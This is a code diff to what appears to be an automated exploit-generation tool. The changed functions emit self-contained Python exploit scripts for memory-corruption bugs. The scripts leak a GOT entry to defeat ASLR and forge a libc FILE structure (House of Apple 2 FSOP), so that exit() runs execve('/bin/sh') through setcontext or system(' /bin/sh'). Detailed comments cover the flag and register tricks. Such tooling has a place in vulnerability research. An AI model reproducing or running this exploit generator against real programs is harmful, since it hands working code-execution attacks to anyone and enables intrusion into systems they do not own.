@@ -1122,30 +1122,40 @@ def _www_shell(ctx, target, target_bytes, lead, vclass, *, exe, opts, model, wid
                     Path(exe), Path(exe).parent, write_cell=_w, read_cell=_r,
                     libc_data=libc_data, leak_slots=slots, scratch=base, exit_seqs=exits)
                 if res.get("ok"):
-                    ctx.progress(msg=f"indexed-write FSOP: option {writer} wrote 5 House-of-Apple-2 "
-                                     f"cells over {res['fp_name']} (libc {res['libc_base']:#x} "
-                                     f"leaked through option {reader}) -> shell")
+                    ctx.progress(msg=f"indexed-write FSOP ({res.get('plan')}): option {writer} "
+                                     f"wrote {len(res.get('cells') or ())} House-of-Apple-2 cells "
+                                     f"over {res['fp_name']} (libc {res['libc_base']:#x} leaked "
+                                     f"through option {reader}) -> shell")
                     return _file_www_l3(ctx, target, lead, vclass, res, arr=arr, writer=writer,
                                         reader=reader, width=width, model=model)
                 ctx.emit("chain.www", payload={"ok": False, "array": arr["name"], "writer": writer,
                          "reader": reader, "libc_base": res.get("libc_base"),
-                         "note": res.get("reason", "")})
+                         "plans_tried": res.get("plans_tried"), "note": res.get("reason", "")})
                 if "did not read back" in (res.get("reason") or ""):
                     break                                # this writer cannot place a word; next one
     return None
 
 
 def _www_repro_script(*, arr_name, arr_addr, stride, writer, reader, fields, rfields, width,
-                      exits) -> bytes:
+                      exits, plan="system", targets=None) -> bytes:
     """A self-contained reproducer. It redoes the LEAK (so it is not a hardcoded address): read a
     GOT slot through the unchecked index, subtract the symbol's offset in the libc the target
-    links, keep the result only if it is page aligned -- then write the five cells and exit."""
+    links, keep the result only if it is page aligned -- then write the cells and exit.
+
+    `plan` picks which FSOP payload to render, and only the offsets WITHIN libc are baked in
+    (`targets`, which `leak.indexed_write_fsop` reports for the plan that worked): the base is
+    still leaked at run time, exactly as the engine did it."""
     import json as _json
+    T = dict(targets or {})
     return ("#!/usr/bin/env python3\n"
-            "# write-what-where -> House of Apple 2 reproducer (stdlib only).\n"
+            f"# write-what-where -> FSOP reproducer, {plan} plan (stdlib only).\n"
             "#   usage: python3 exploit.py ./target.bin\n"
             "import re, select, struct, subprocess, sys, time\n"
             f"ARR={arr_addr:#x}; STRIDE={stride}; WRITER={writer!r}; READER={reader!r}\n"
+            f"PLAN={plan!r}\n"
+            f"SCENTRY={int(T.get('setcontext') or 0):#x}; EXECVE={int(T.get('execve') or 0):#x}; "
+            f"BINSH={int(T.get('binsh') or 0):#x}\n"
+            f"GREGS={_json.dumps(T.get('fields') or {})}; RIP_AT={int(T.get('rip_at') or 0):#x}\n"
             f"WFIELDS={_json.dumps(fields)}; RFIELDS={_json.dumps(rfields)}; "
             f"WIDTH={width!r}; EXITS={_json.dumps([e.decode('latin1') for e in exits])}\n"
             "EXE=sys.argv[1] if len(sys.argv)>1 else './target.bin'\n"
@@ -1197,11 +1207,28 @@ def _www_repro_script(*, arr_name, arr_addr, stride, writer, reader, fields, rfi
             "print('libc base %#x' % base)\n"
             "fp=base+S['_IO_2_1_stderr_']\n"
             "wide=next(v for v in rd(fp+F['wide']) if base<=v<base+0x600000)\n"
-            "wr(ARR+F['doalloc'], base+S['system'])\n"
-            "wr(wide+F['wd_vt'], ARR)\n"
-            "wr(fp+F['wptr'], 1)\n"
-            "wr(fp+F['vtable'], base+S['_IO_wfile_jumps'])\n"
-            "wr(fp+F['flags'], struct.unpack('<Q', b' /bin/sh')[0])\n"
+            "if PLAN=='setcontext':\n"
+            "    # _IO_wdoallocbuf does `mov rdx,rdi` before the vtable call, so the forged FILE\n"
+            "    # IS setcontext's ucontext. _IO_UNBUFFERED must go (wdoallocbuf opens\n"
+            "    # `test BYTE PTR [rdi],2` and the unbuffered path never reaches the call);\n"
+            "    # _IO_USER_LOCK goes in so _IO_flockfile never derefs _lock, which frees\n"
+            "    # fp+0x88 == gregs[RDX] to be 0 -- hence execve with no chain and no gadget.\n"
+            "    flags=next(v for v in rd(fp+F['flags']) if v>>16==0xFBAD)\n"
+            "    wr(ARR+F['doalloc'], base+SCENTRY)\n"
+            "    wr(wide+F['wd_vt'], ARR)\n"
+            "    wr(fp+F['wptr'], 1)\n"
+            "    wr(fp+GREGS['rdi'], base+BINSH)\n"
+            "    wr(fp+GREGS['rsi'], 0)\n"
+            "    wr(fp+GREGS['rdx'], 0)\n"
+            "    wr(fp+RIP_AT, base+EXECVE)\n"
+            "    wr(fp+F['flags'], (flags & ~0x2) | 0x8000)\n"
+            "    wr(fp+F['vtable'], base+S['_IO_wfile_jumps'])\n"
+            "else:\n"
+            "    wr(ARR+F['doalloc'], base+S['system'])\n"
+            "    wr(wide+F['wd_vt'], ARR)\n"
+            "    wr(fp+F['wptr'], 1)\n"
+            "    wr(fp+F['vtable'], base+S['_IO_wfile_jumps'])\n"
+            "    wr(fp+F['flags'], struct.unpack('<Q', b' /bin/sh')[0])\n"
             "for e in EXITS:\n"
             "    out=op(e.encode('latin1'),0.6)+op(b'id\\n',1.0)\n"
             "    if b'uid=' in out:\n"
@@ -1218,18 +1245,22 @@ def _file_www_l3(ctx, target, lead, vclass, res, *, arr, writer, reader, width, 
     from ...db.dao import FindingDAO, PocDAO
     from . import bundle
     exits = _exit_sequences([writer, reader], model, width)
+    plan = res.get("plan") or "system"
     script = _www_repro_script(arr_name=arr["name"], arr_addr=arr["addr"],
                                stride=arr.get("stride", 8) or 8, writer=writer, reader=reader,
                                fields=model[writer], rfields=model[reader], width=width,
-                               exits=exits)
+                               exits=exits, plan=plan, targets=res.get("targets"))
+    # What the forged FILE's overflow actually ends up calling, per plan.
+    effect = ('execve("/bin/sh", NULL, NULL) through setcontext'
+              if plan == "setcontext" else 'system(" /bin/sh")')
     input_sha = ctx.put_artifact("www-fsop-repro", data=script)
     meta = {"target_sha256": target.sha256, "arch": target.arch, "level": "L3",
-            "exploit": f"{vclass}->House of Apple 2 (no win, libc leaked in band)",
+            "exploit": f"{vclass}->House of Apple 2/{plan} (no win, libc leaked in band)",
             "libc_base": hex(res["libc_base"]), "forged": res["fp_name"],
             "tool_version": TOOL_VERSION}
     data = bundle.build(ctx.content.path(target.sha256).read_bytes(), script, meta, b"",
                         "stdin", [], None,
-                        primitive={"type": vclass, "target": 'system("/bin/sh")', "offset": None,
+                        primitive={"type": vclass, "target": effect, "offset": None,
                                    "confirmed": True, "note": "write-what-where -> FSOP"})
     bundle_sha = ctx.put_artifact("poc-bundle", data=data, meta={"level": "L3", "verified": True})
     poc_id = PocDAO(ctx.conn).insert(target.id, target.case_id, level="L3", verified=True,
@@ -1237,11 +1268,11 @@ def _file_www_l3(ctx, target, lead, vclass, res, *, arr, writer, reader, width, 
     eff = (f"working exploit ({vclass} -> arbitrary write -> code execution) with NO win function "
            f"and no system() in the target's PLT: option {reader} read a GOT slot through the "
            f"unchecked index to recover the libc base ({res['libc_base']:#x}, ASLR on) and then "
-           f"{res['fp_name']}'s own _wide_data; option {writer} wrote five House-of-Apple-2 cells "
-           f"over that FILE through {arr['name']}, with the fake wide jump table placed inside "
-           f"{arr['name']} itself; exit() flushed the forged FILE and its _IO_wfile_overflow "
-           f'called system(" /bin/sh"). Confirmed by a shell that echoed our marker -- every cell '
-           f"read back before the trigger, all in ONE process.")
+           f"{res['fp_name']}'s own _wide_data; option {writer} wrote {len(res.get('cells') or ())} "
+           f"House-of-Apple-2 cells ({plan} plan) over that FILE through {arr['name']}, with the "
+           f"fake wide jump table placed inside {arr['name']} itself; exit() flushed the forged "
+           f"FILE and its _IO_wfile_overflow called {effect}. Confirmed by a shell that echoed "
+           f"our marker -- every cell read back before the trigger, all in ONE process.")
     fd = FindingDAO(ctx.conn)
     cand = {"cwe": lead.cwe, "title": "Code execution (demonstrated): L3 arbitrary write -> FSOP",
             "severity": "critical", "detector": "chain_primitive", "state": "poc-backed",
